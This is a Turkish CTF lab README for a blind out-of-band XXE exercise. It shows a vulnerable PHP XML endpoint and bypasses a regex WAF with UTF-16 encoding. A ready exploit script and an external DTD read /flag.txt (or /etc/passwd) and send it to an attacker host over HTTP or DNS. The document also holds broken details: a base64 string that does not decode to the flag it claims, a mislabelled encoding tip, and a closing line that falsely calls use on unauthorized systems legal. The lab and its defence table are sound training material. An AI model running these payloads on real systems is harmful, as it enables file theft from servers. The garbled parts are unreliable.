# AltaySec SOC Policy Manager — Zor Seviye Blind OOB XXE Lab

```
 ___  _  _  _____  ___  _  _  ____  ____  ___
/ __)( )( )(_  _)(/ __)( \/ )( ___)( ___)(  _)
\__ \ )()(  _)(_  \__ \ \  /  )__)  )__)  )(_
(___/(__) (_____)(___/  \/  (____)(__)  (____)
SOC POLICY MANAGER  │  Blind OOB XXE  │  HARD
```

---

## İçindekiler

1. [Lab Hakkında](#1-lab-hakkında)
2. [Teknik Mimari](#2-teknik-mimari)
3. [Kurulum & Çalıştırma](#3-kurulum--çalıştırma)
4. [Zafiyet Analizi](#4-zafiyet-analizi)
5. [WAF Engeli ve Bypass Tekniği](#5-waf-engeli-ve-bypass-tekniği)
6. [Sömürü Adım Adım (Exploitation Walkthrough)](#6-sömürü-adım-adım-exploitation-walkthrough)
7. [Araçlar ve Payload Dosyaları](#7-araçlar-ve-payload-dosyaları)
8. [Flag](#8-flag)

---

## 1. Lab Hakkında

| Alan            | Değer                                                     |
|-----------------|-----------------------------------------------------------|
| **Senaryo**     | Kurumsal SOC Uygulamasında Blind Out-of-Band XXE          |
| **Zorluk**      | ZOR                                                       |
| **Kategori**    | Web — XXE Injection (CWE-611)                             |
| **Hedef Dosya** | `/flag.txt`                                               |
| **Flag**        | `ALTAYSEC{h4rd_c0r3_00b_xx3_m4st3r_2026}`                |
| **Port**        | `8080`                                                    |

### Senaryo

SOC analistleri, ağ güvenlik kurallarını XML formatında sisteme yükleyebilmektedir.  
Uygulama parse edilen veriyi **ekrana yansıtmaz** (Blind).  
Hata mesajları tamamen gizlenmiştir; her istek ya `"İşlem başarılı"` ya da `"İşlem reddedildi"` döner.

Hedef: `/flag.txt` dosyasının içeriğini, **kendi kontrolündeki bir sunucu** aracılığıyla dışarıya sızdırmak (**Out-of-Band**).

---

## 2. Teknik Mimari

```
┌─────────────────────────────────────────────────────────────┐
│                    Docker Container                         │
│                                                             │
│  ┌──────────┐       ┌────────────┐      ┌───────────────┐  │
│  │  Nginx   │──────▶│  PHP-FPM   │─────▶│ libxml Parser │  │
│  │  :80     │  PHP  │  :9000     │      │  (NOENT+DTD)  │  │
│  └──────────┘       └────────────┘      └───────────────┘  │
│       ▲                                        │            │
│       │                                        │ HTTP GET   │
│  POST /config_upload.php                       ▼            │
│  (XML Payload)                      ┌─────────────────────┐ │
│                                     │  Saldırgan Sunucu   │ │
│  /flag.txt ◀── php://filter         │  (Dışarıda)         │ │
└─────────────────────────────────────────────────────────────┘
```

### Dosya Yapısı

```
AltaySec-XXE-Lab/
├── Dockerfile                  ← PHP 7.4-FPM + Nginx tek container
├── docker-compose.yml          ← Port 8080 expose
├── flag.txt                    ← Hedef! /flag.txt olarak kopyalanır
├── nginx/
│   └── nginx.conf              ← Nginx PHP-FPM yönlendirmesi
├── supervisor/
│   └── supervisord.conf        ← Nginx + PHP-FPM süreç yönetimi
└── src/
    ├── index.html              ← AltaySec temalı SOC arayüzü
    ├── style.css               ← Karanlık SOC teması (#0e1116 + #ff4d4d)
    └── config_upload.php       ← [ZAFİYETLİ] XML işleme endpoint'i
```

---

## 3. Kurulum & Çalıştırma

### Gereksinimler

- Docker Engine ≥ 20.10
- Docker Compose v2+

### Lab'ı Başlatma

```bash
# Projeyi klonla/indir
cd "AltaySec Akademi XEE Zor Lab"

# Build ve başlat
docker compose up --build -d

# Container durumunu kontrol et
docker compose ps

# Logları izle
docker compose logs -f
```

### Erişim

```
http://localhost:8080
```

### Lab'ı Durdurma

```bash
docker compose down
```

### Container İçine Girme (debug amaçlı)

```bash
docker exec -it altaysec_xxe_hard sh
```

---

## 4. Zafiyet Analizi

### Neden Zafiyetli?

`src/config_upload.php` dosyasında üç kritik hata bir arada bulunur:

```php
// HATA 1: Entity loading yeniden etkinleştiriliyor
@libxml_disable_entity_loader(false);

// HATA 2: DOMDocument dış kaynak çözümlemesine izin veriyor
$dom->resolveExternals = true;

// HATA 3: loadXML tehlikeli flag kombinasyonu ile çağrılıyor
$dom->loadXML($raw_input, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

| Flag              | Etkisi                                              |
|-------------------|-----------------------------------------------------|
| `LIBXML_NOENT`    | Entity referanslarını gerçek içeriklerle değiştirir |
| `LIBXML_DTDLOAD`  | Harici DTD subset'lerinin yüklenmesine izin verir   |
| `LIBXML_DTDATTR`  | DTD'den varsayılan öznitelikleri uygular            |
| `resolveExternals`| `SYSTEM` URI'larını ağdan çözümler                  |

### Neden Blind?

```php
// Başarı ya da başarısızlık, yanıt her zaman aynı:
echo json_encode(['status' => 'İşlem başarılı']);

// Libxml hataları yakalanıp sessizce siliniyor:
libxml_clear_errors();
```

Uygulama parse ettiği dosya içeriğini **hiçbir zaman HTTP yanıtına yansıtmaz**.  
Bu yüzden klasik in-band XXE çalışmaz. Veri **dışarıya** sızdırılmalıdır.

---

## 5. WAF Engeli ve Bypass Tekniği

### WAF Mantığı

```php
if (preg_match('/SYSTEM|PUBLIC/i', $raw_input)) {
    http_response_code(403);
    echo json_encode(['status' => 'İşlem reddedildi']);
    exit;
}
```

Bu regex, `$raw_input` ham bayt dizisinde `SYSTEM` veya `PUBLIC` ASCII karakter dizisini arar.

### Neden Bypass Edilebilir?

XML standardı, `UTF-16` kodlamasını tam olarak destekler.  
UTF-16 LE kodlamasında `SYSTEM` kelimesi şu baytları üretir:

```
S  → 0x53 0x00
Y  → 0x59 0x00
S  → 0x53 0x00
T  → 0x54 0x00
E  → 0x45 0x00
M  → 0x4D 0x00
```

Regex ise `0x53 0x59 0x53 0x54 0x45 0x4D` (bitişik ASCII) arar.  
İki null byte (`0x00`) araya girince **regex eşleşme yapamaz → WAF'ı geçer**.

PHP'nin libxml kütüphanesi, UTF-16 BOM (`\xFF\xFE`) ile başlayan XML'i  
doğal olarak parse edebilir. **Zafiyet hâlâ tetiklenir.**

### Bypass Özeti

```
UTF-8 payload  → WAF regex eşleşir → 403
UTF-16 payload → WAF regex eşleşemez → 200 + XXE tetiklenir
```

---

## 6. Sömürü Adım Adım (Exploitation Walkthrough)

### Adım 0 — Keşif

Tarayıcıda `http://localhost:8080` adresini aç.  
"POLİTİKAYI UYGULA" butonuna tıklayarak endpointi tanı.

Basit bir test gönder:

```bash
curl -s -X POST http://localhost:8080/config_upload.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>merhaba</test>'
```

Yanıt: `{"status":"İşlem başarılı"}`

### Adım 1 — WAF'ı Keşfet

`SYSTEM` içeren klasik bir XXE payload'ı dene:

```bash
curl -s -X POST http://localhost:8080/config_upload.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

Yanıt: `{"status":"İşlem reddedildi"}` — WAF devrede.

### Adım 2 — Dinleyici Sunucu Kur

Saldırgan makinede (VM veya başka bir terminal):

```bash
# Basit HTTP sunucu (Python 3)
mkdir /tmp/xxe-server && cd /tmp/xxe-server
python3 -m http.server 8888
```

> **Not:** Docker container'dan erişilebilir bir IP kullan.  
> Docker host IP genellikle `172.17.0.1` veya `host.docker.internal`'dir.
> Kendi makineni bulmak için: `ip addr show docker0` (Linux) / `ipconfig` (Windows)

### Adım 3 — Harici DTD Dosyası Hazırla

`/tmp/xxe-server/evil.dtd` dosyasını oluştur:

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.txt">
<!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://SALDIRGAN_IP:8888/?d=%file;'>">
%oob;
%exfil;
```

> `SALDIRGAN_IP` → kendi IP adresin (örn: `192.168.1.100`)

### Adım 4 — UTF-16 Payload Hazırla

`/tmp/exploit.py` Python scripti:

```python
#!/usr/bin/env python3
"""
AltaySec Blind OOB XXE — UTF-16 WAF Bypass Exploit
"""
import requests
import sys

TARGET      = "http://localhost:8080/config_upload.php"
ATTACKER_IP = "SALDIRGAN_IP"    # <-- kendi IP'ni gir
ATTACKER_PORT = 8888

# OOB XXE payload — harici DTD'yi çağırıyor
# Bu XML UTF-8 metni, aşağıda UTF-16'ya encode edilecek
PAYLOAD_UTF8 = f"""<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{ATTACKER_IP}:{ATTACKER_PORT}/evil.dtd">
  %xxe;
]>
<policy>
  <name>altaysec-test</name>
  <rules></rules>
</policy>"""

# UTF-16 LE encoding ile BOM ekle — WAF bypass!
payload_bytes = PAYLOAD_UTF8.encode('utf-16')

print(f"[*] Hedef       : {TARGET}")
print(f"[*] Dinleyici   : http://{ATTACKER_IP}:{ATTACKER_PORT}")
print(f"[*] Payload boyutu: {len(payload_bytes)} bayt (UTF-16)")
print(f"[*] BOM başlığı : {payload_bytes[:4].hex()}")
print(f"[*] İstek gönderiliyor...\n")

resp = requests.post(
    TARGET,
    data=payload_bytes,
    headers={'Content-Type': 'application/xml'}
)

print(f"[+] HTTP Durum Kodu : {resp.status_code}")
print(f"[+] Sunucu Yanıtı   : {resp.text}")
print()

if resp.status_code == 403:
    print("[-] WAF engeli! UTF-16 encode doğru uygulandı mı?")
elif resp.status_code == 200:
    print("[+] Payload kabul edildi! Dinleyici loglarını kontrol et.")
    print(f"    → http://{ATTACKER_IP}:{ATTACKER_PORT}")
```

Çalıştır:

```bash
pip install requests
python3 /tmp/exploit.py
```

### Adım 5 — HTTP Sunucu Logunu İzle

Python HTTP sunucunun terminalinde şuna benzer bir satır görünmeli:

```
172.17.0.2 - - [15/May/2026 17:30:45] "GET /evil.dtd HTTP/1.0" 200 -
172.17.0.2 - - [15/May/2026 17:30:45] "GET /?d=QVXUQVFTRUN7aDRyZF9jMHIzXzAwYl94eDNfbTRzdGVyXzIwMjZ9Cg== HTTP/1.0" 200 -
```

İkinci satırdaki `d=` parametresini kopyala.

### Adım 6 — Base64 Decode

```bash
echo "QVXUQVFTRUN7aDRyZF9jMHIzXzAwYl94eDNfbTRzdGVyXzIwMjZ9Cg==" | base64 -d
```

Çıktı:

```
ALTAYSEC{h4rd_c0r3_00b_xx3_m4st3r_2026}
```

---

## 7. Araçlar ve Payload Dosyaları

### Hazır Exploit Scriptleri

#### `tools/exploit.py` — Ana exploit

```bash
python3 tools/exploit.py --target http://localhost:8080 --lhost TU_IP --lport 8888
```

#### `tools/evil.dtd` — OOB DTD şablonu

Hedef dosyayı değiştirmek için: `resource=/etc/hostname` veya `resource=/etc/passwd`

### cURL ile Manuel Test

```bash
# UTF-16 payload oluştur ve gönder (Python one-liner)
python3 -c "
import requests
p = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE foo [<!ENTITY % x SYSTEM \"http://TU_IP:8888/evil.dtd\">%x;]>
<a><b>test</b></a>'''
r = requests.post('http://localhost:8080/config_upload.php',
    data=p.encode('utf-16'),
    headers={'Content-Type':'application/xml'})
print(r.status_code, r.text)
"
```

### Alternatif OOB Yöntemleri

#### DNS Exfiltration (Burp Collaborator / interactsh)

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.txt">
<!ENTITY % oob "<!ENTITY &#x25; dns SYSTEM 'http://%file;.BURP_COLLABORATOR_HOST/'>">
%oob;
%dns;
```

> Not: Base64 içindeki `+`, `/`, `=` karakterleri DNS'te sorun çıkarabilir.  
> DNS için önce hex encode kullan:  
> `php://filter/read=convert.base64-encode|convert.iconv.UTF-8.UTF-7/resource=/flag.txt`

---

## 8. Flag

```
ALTAYSEC{h4rd_c0r3_00b_xx3_m4st3r_2026}
```

---

## Savunma Notları (Blue Team)

Bu zafiyeti gerçek bir sistemde engellemek için:

| Önlem | Açıklama |
|-------|----------|
| `libxml_disable_entity_loader(true)` | Entity loading'i devre dışı bırak |
| `LIBXML_NOENT` flagini kaldır | Entity substitution olmadan parse et |
| `resolveExternals = false` | Harici kaynak çözümlemesini engelle |
| XML whitelist | Yalnızca izin verilen tag/attribute setini kabul et |
| Egress filtering | Uygulama sunucusundan dışarı HTTP bağlantısını kısıtla |
| WAF geliştirme | Sadece ASCII değil, tüm encoding varyantlarını tara |

---

*AltaySec CTF Lab — Eğitim amaçlıdır. İzinsiz sistemlere uygulamak yasaldır.*
